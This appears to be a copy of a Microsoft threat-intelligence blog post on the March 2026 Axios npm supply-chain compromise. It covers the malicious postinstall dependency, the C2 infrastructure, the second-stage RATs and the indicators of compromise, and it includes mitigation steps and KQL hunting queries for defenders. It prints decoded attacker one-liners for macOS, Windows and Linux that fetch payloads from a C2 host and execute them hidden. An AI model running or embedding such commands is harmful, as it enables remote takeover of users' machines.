---
date: 2026-04-01 21:00:00 +00:00
external_url: https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/
primary_section: security
author: Microsoft Threat Intelligence and Microsoft Defender Security Research Team
title: Mitigating the Axios npm supply chain compromise
tags:
- Advanced Hunting
- Axios
- C2 Infrastructure
- CI/CD Security
- Credential Rotation
- Dependabot
- Dependency Pinning
- Indicators Of Compromise
- IOC
- KQL
- Lifecycle Scripts
- Linux
- Linux Python Payload
- Macos
- Macos AppleScript
- Malicious Dependency
- Microsoft Defender For Cloud
- Microsoft Defender For Endpoint
- Microsoft Defender XDR
- Microsoft Sentinel
- Microsoft Threat Intelligence
- News
- North Korea
- npm
- npm Overrides
- OIDC
- Plain Crypto JavaScript
- Postinstall Script
- PowerShell
- RAT
- Remote Access Trojan
- Renovate
- Sapphire Sleet
- Security
- Sleet
- Supply Chain Attack
- Trusted Publishing
- VBScript
- Windows
- Windows Registry Run Key
section_names:
- security
feed_name: Microsoft Security Blog
---

Microsoft Threat Intelligence and Microsoft Defender Security Research Team details how malicious Axios npm releases (1.14.1 and 0.30.4) pulled second-stage RAT payloads from Sapphire Sleet infrastructure, and provides concrete mitigation steps plus Defender/Sentinel hunting guidance to detect and contain impacted developer machines and CI/CD systems.<!--excerpt_end-->

## Summary

On March 31, 2026, two newly published Axios npm package versions—**axios@1.14.1** and **axios@0.30.4**—were identified as malicious. The packages were modified to include a malicious dependency that executes during installation, connects to a Sapphire Sleet command-and-control (C2) endpoint, and downloads an OS-specific second-stage **remote access trojan (RAT)**.

Microsoft Threat Intelligence attributed the Axios npm compromise to **Sapphire Sleet**, a North Korean state actor.

## What happened

- Two malicious Axios versions were released:
  - **axios@1.14.1**
  - **axios@0.30.4**
- These versions added a dependency on **plain-crypto-js@^4.2.1**.
- The legitimate Axios runtime logic was not modified; the compromise relied on **dependency insertion** and **install-time execution**.

## How the attack works

### Silent install-time code execution via dependency insertion

- The injected dependency (**plain-crypto-js@4.2.1**) executes automatically through a **post-install** mechanism.
- It runs **`node setup.js`** during `npm install` / `npm update` without user interaction.
- The dependency was staged to look legitimate:
  - A clean version (**plain-crypto-js@4.2.0**) established history.
  - The next version (**plain-crypto-js@4.2.1**) introduced the malicious install hook and included a placeholder manifest (**package.md**) intended to later masquerade as a normal manifest.

Microsoft notes that the publish metadata for the malicious Axios versions differed from typical CI-backed publishing patterns (for example, missing trusted publisher binding and missing repo tag/commit trail).

### First-stage loader behavior (setup.js)

During installation:

- `setup.js` uses layered obfuscation to reconstruct strings (module names, platform identifiers, paths, commands) at runtime.
- It detects the OS and connects to:
  - **hxxp://sfrclak[.]com:8000/6202033**
- It POSTs one of the following identifiers to get an OS-specific payload:
  - macOS: `packages.npm.org/product0`
  - Windows: `packages.npm.org/product1`
  - Linux/other: `packages.npm.org/product2`

### Single C2 endpoint with OS-specific responses

- Domain: **sfrclak[.]com**
- IP: **142.11.206[.]73**
- Port: **8000**
- Path: **/6202033**

The IP was noted as tied to Hostwinds (VPS provider) and described as infrastructure Sapphire Sleet commonly uses.

## Second-stage payloads by OS

### macOS (Darwin)

- Payload: native binary **`com.apple.act.mond`**
- Typical on-disk artifact:
  - **/Library/Caches/com.apple.act.mond**
- Technique:
  - `setup.js` writes and runs AppleScript via `osascript` (detached with `nohup`).
  - AppleScript downloads the binary, applies `chmod 770`, and executes it via `/bin/zsh` in the background.
- SHA-256:
  - `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a`

Observed command (as decoded):

```bash
sh -c 'curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s hxxp://sfrclak[.]com:8000/6202033 && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c "/Library/Caches/com.apple.act.mond hxxp://sfrclak[.]com:8000/6202033 &" &> /dev/null'
```

### Windows

- Payload: PowerShell RAT **`6202033.ps1`**
- Stager dropped:
  - **%TEMP%\6202033.vbs**
- Persistence:
  - Creates **%PROGRAMDATA%\system.bat**
  - Adds registry Run key:
    - **HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate**
- Masquerading/LOLBIN usage:
  - Locates PowerShell (`where powershell`)
  - Copies/renames PowerShell into **%PROGRAMDATA%\wt.exe** (masquerading)
  - Runs VBScript via `cscript //nologo` to keep windows hidden

SHA-256 values called out in the post:

- `6202033.ps1`:
  - `ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c`
  - `617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101`
- `%PROGRAMDATA%\system.bat`:
  - `f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd`

Observed command (as decoded):

```bat
"cmd.exe" /c curl -s -X POST -d "packages.npm.org/product1" "hxxp://sfrclak[.]com:8000/6202033" > "C:\Users\\AppData\Local\Temp\6202033.ps1" & "C:\ProgramData\wt.exe" -w hidden -ep bypass -file "C:\Users\\AppData\Local\Temp\6202033.ps1" "hxxp://sfrclak[.]com:8000/6202033" & del "C:\Users\\AppData\Local\Temp\6202033.ps1" /f
```

### Linux/others

- Payload: Python loader **`ld.py`**
- Typical on-disk artifact:
  - **/tmp/ld.py**
- Behavior:
  - Downloads `/tmp/ld.py` and executes detached using `nohup python3`, suppressing output.
- SHA-256:
  - `fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf`

Observed command (as decoded):

```bash
/bin/sh -c "curl -o /tmp/ld.py -d packages.npm.org/product2 -s hxxp://sfrclak[.]com:8000/6202033 && nohup python3 /tmp/ld.py hxxp://sfrclak[.]com:8000/6202033 > /dev/null 2>&1 &"
```

## Post-execution defense evasion

After executing the second-stage payload, the installer logic:

- Removes the loader **setup.js**
- Removes the original manifest **package.json** that contained the install trigger
- Renames **package.md** to **package.json** to leave a clean-looking manifest behind

## Why this RAT matters (Windows details)

The Windows PowerShell RAT is described as a covert remote management component that:

- Collects system/hardware inventory (OS version, boot time, hardware, processes)
- Establishes persistence using a hidden startup entry disguised as a legitimate update process
- Communicates via periodic encoded HTTP POST requests
- Supports commands to:
  - Execute arbitrary PowerShell code
  - Enumerate files/directories
  - Inject additional binary payloads into memory
  - Terminate execution
- Reduces forensic visibility via in-memory execution, temporary files, and Base64-encoded payloads

## Immediate actions if you might be affected

If your organization installed the malicious Axios versions, the guidance includes:

- **Rotate secrets/credentials immediately**
- **Downgrade** to safe versions:
  - **axios@1.14.0** (or earlier)
  - **axios@0.30.3** (or earlier)
- Use overrides/pinning to control transitive dependencies
- Flush local cache:
  - `npm cache clean --force`
- Disable or restrict dependency bots for critical packages
- Adopt **Trusted Publishing with OIDC** to eliminate stored credentials
- Review CI/CD logs for installs resolving to the compromised versions or for `plain-crypto-js`
- Look for outbound connections to:
  - `sfrclak[.]com`
  - `142.11.206[.]73` (port 8000)
- Developer machines: search for `node_modules` containing:
  - `plain-crypto-js`
  - `axios@1.14.1`
  - `axios@0.30.4`
- When possible, ignore install scripts:
  - `npm ci --ignore-scripts`
  - or set default behavior: `npm config set ignore-scripts true`
- Remove Axios files/code from victim systems and reinstall cleanly

## Hardening to prevent repeat incidents

### Pin Axios versions (avoid ^ and ~)

Remove caret (`^`) or tilde (`~`) and use an exact version:

```json
{ "dependencies": { "axios": "1.14.0" } }
```

### Force a pinned version via overrides (npm ≥ 14)

```json
{ "overrides": { "axios": "1.14.0" } }
```

### Restrict dependency bots

Example Dependabot configuration snippet:

```yaml
ignore:
  - dependency-name: "axios"
```

## Microsoft Defender detections and protections

The post lists Microsoft Defender coverage across the kill chain, including (among others):

- Microsoft Defender for Cloud: malicious Axios supply chain activity detected
- Microsoft Defender for Endpoint:
  - `Trojan:Script/SuspObfusRAT.A` (blocking)
  - `TrojanDownloader:JS/Crosdomd.A` (blocking)
  - `Trojan:JS/AxioRAT.DA!MTB` (blocking)
  - macOS and Linux detections for related backdoors/loaders
  - Windows detections for PowerShell/BAT components and suspicious behaviors
- Network protection / SmartScreen blocks the observed malicious indicators

## Indicators of compromise (IOCs)

Key IOCs called out:

- Domain: `sfrclak[.]com`
- IP: `142.11.206[.]73`
- URL: `hxxp://sfrclak[.]com:8000/6202033`
- Windows artifacts:
  - `%TEMP%\6202033.vbs`
  - `%TEMP%\6202033.ps1`
  - `%PROGRAMDATA%\system.bat`
  - `C:\ProgramData\wt.exe`
- macOS artifact:
  - `/Library/Caches/com.apple.act.mond`
- Linux artifact:
  - `/tmp/ld.py`
- POST identifiers:
  - `packages.npm.org/product0`
  - `packages.npm.org/product1`

## Hunting queries

### Microsoft Defender XDR (Advanced Hunting)

Installed Node.js packages with malicious versions:

```kusto
DeviceTvmSoftwareInventory
| where (SoftwareName has "axios" and SoftwareVersion in ("1.14.1", "0.30.4"))
    or (SoftwareName has "plain-crypto-js" and SoftwareVersion == "4.2.1")
```

Detect the RAT dropper and subsequent download and execution:

```kusto
CloudProcessEvents
| where ProcessCurrentWorkingDirectory endswith '/node_modules/plain-crypto-js'
    and (ProcessCommandLine has_all ('plain-crypto-js','node setup.js'))
    or ProcessCommandLine has_all ('/tmp/ld.py','sfrclak.com:8000')
```

Connection to known C2:

```kusto
DeviceNetworkEvents
| where Timestamp > ago(2d)
| where RemoteUrl contains "sfrclak.com"
| where RemotePort == "8000"
```

Curl execution patterns:

```kusto
DeviceProcessEvents
| where Timestamp > ago(2d)
| where (FileName =~ "cmd.exe" and ProcessCommandLine has_all ("curl -s -X POST -d", "packages.npm.org", "-w hidden -ep", ".ps1", "& del", ":8000"))
    or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "nohup", ".py", ":8000/", "> /dev/null 2>&1") and ProcessCommandLine contains "python")
    or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "com.apple.act.mond", "http://",":8000/", "&> /dev/null"))
```

### Microsoft Sentinel (ASIM)

Detect network session IP/domain IOCs using ASIM:

```kusto
//IP list and domain list- _Im_NetworkSession
let lookback = 30d;
let ioc_ip_addr = dynamic(['142.11.206.73']);
let ioc_domains = dynamic(["http://sfrclak.com:8000", "http://sfrclak.com"]);
_Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())
| where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains)
| summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count()
    by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor
```

Detect web session IP/domain IOCs using ASIM:

```kusto
//IP list - _Im_WebSession
let lookback = 30d;
let ioc_ip_addr = dynamic(['142.11.206.73']);
_Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now())
| where DstIpAddr in (ioc_ip_addr)
| summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count()
    by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor

// Domain list - _Im_WebSession
let ioc_domains = dynamic(["http://sfrclak.com:8000", "http://sfrclak.com"]);
_Im_WebSession (url_has_any = ioc_domains)
```

## Related Microsoft reports and tools

Threat analytics reports referenced:

- Activity profile: Mitigating the Axios npm supply chain compromise: https://security.microsoft.com/threatanalytics3/22b71a55-3c2a-4634-856d-0e937a95834b/overview
- Threat profile overview: North Korea state-sponsored activity: https://security.microsoft.com/threatanalytics3/b24de28e-e504-4266-ae56-902d1abed27c/overview?
- Technique profile: Malicious npm lifecycle scripts: https://security.microsoft.com/threatanalytics3/abc7c39c-4ca0-4325-bcbf-18a3bc8fab01/overview
- Actor profile: Sapphire Sleet: https://security.microsoft.com/threatanalytics3/5ab8c4d1-be7d-4ef9-88b0-6e4f8c356f84/overview

The post also points to Microsoft Security Copilot integration and agent capabilities within Microsoft Defender:

- Security Copilot + Defender TI integration: https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti
- Embedded experience in Defender portal: https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr
- Agents overview: https://learn.microsoft.com/copilot/security/agents-overview

## Source

Original post: https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/

Related supply-chain context link included in the post: https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/

Image referenced (Defender for Cloud query screenshot):

![Screenshot of Microsoft Defender for Cloud cloud security explorer query for axios and plain-crypto-js packages](https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2026/04/image.webp)


[Read the entire article](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/)

